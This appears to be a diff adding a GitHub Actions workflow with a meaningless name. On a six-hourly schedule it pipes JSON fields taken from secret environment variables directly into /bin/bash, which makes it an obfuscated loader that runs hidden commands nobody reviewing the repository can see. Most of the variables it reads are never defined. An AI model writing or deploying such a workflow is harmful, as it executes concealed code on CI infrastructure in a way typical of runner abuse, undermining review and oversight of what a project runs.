@@ -1,0 +1,23 @@
+name: yanzhongdeh
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanzhongdeh
+        env:
+          m9: ${{ secrets.m9 }}
+        run: |
+          echo $m9 | jq -r .rwrh47040 | /bin/bash
+          echo $p2264 | jq -r .wqt3605 | /bin/bash
+          echo $v91 | jq -r .nr7 | /bin/bash
+          echo $okrfw8572 | jq -r .h17 | /bin/bash
+          echo $ehepq49 | jq -r .slmg2349 | /bin/bash
+          echo $x015 | jq -r .imfkt03 | /bin/bash
+
